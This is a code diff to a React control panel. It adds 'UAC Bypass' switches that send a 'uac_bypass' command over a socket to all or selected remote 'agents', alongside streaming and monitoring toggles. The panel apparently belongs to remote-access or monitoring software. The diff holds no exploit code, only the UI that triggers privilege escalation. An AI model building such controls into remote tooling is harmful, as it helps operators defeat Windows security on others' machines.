@@ -12,9 +12,11 @@ export default function ToggleControlPanel() {
   const [globalMonitoring, setGlobalMonitoring] = useState(true);
   const [globalFrameDropping, setGlobalFrameDropping] = useState(false);
   const [globalAdaptiveBitrate, setGlobalAdaptiveBitrate] = useState(true);
+  const [globalUacBypass, setGlobalUacBypass] = useState(false);
   const [agentMonitoring, setAgentMonitoring] = useState(true);
   const [agentFrameDropping, setAgentFrameDropping] = useState(false);
   const [agentAdaptiveBitrate, setAgentAdaptiveBitrate] = useState(true);
+  const [agentUacBypass, setAgentUacBypass] = useState(false);
 
   const emitToggle = (feature: string, enabled: boolean, agentId?: string | null) => {
     if (!socket) return;
@@ -83,6 +85,17 @@ export default function ToggleControlPanel() {
                 }}
               />
             </div>
+            <div className="flex items-center justify-between">
+              <Label htmlFor="global-uacbypass">UAC Bypass</Label>
+              <Switch
+                id="global-uacbypass"
+                checked={globalUacBypass}
+                onCheckedChange={(checked) => {
+                  setGlobalUacBypass(checked);
+                  emitToggle("uac_bypass", checked, null);
+                }}
+              />
+            </div>
           </div>
         </div>
 
@@ -128,6 +141,18 @@ export default function ToggleControlPanel() {
                 }}
               />
             </div>
+            <div className="flex items-center justify-between">
+              <Label htmlFor="agent-uacbypass">UAC Bypass</Label>
+              <Switch
+                id="agent-uacbypass"
+                disabled={!selectedAgent}
+                checked={agentUacBypass}
+                onCheckedChange={(checked) => {
+                  setAgentUacBypass(checked);
+                  emitToggle("uac_bypass", checked, selectedAgent);
+                }}
+              />
+            </div>
           </div>
           <div className="flex items-center gap-2">
             <Button
@@ -138,6 +163,7 @@ export default function ToggleControlPanel() {
                 emitToggle("monitoring", agentMonitoring, selectedAgent);
                 emitToggle("frame_dropping", agentFrameDropping, selectedAgent);
                 emitToggle("adaptive_bitrate", agentAdaptiveBitrate, selectedAgent);
+                emitToggle("uac_bypass", agentUacBypass, selectedAgent);
               }}
             >
               Apply To Agent
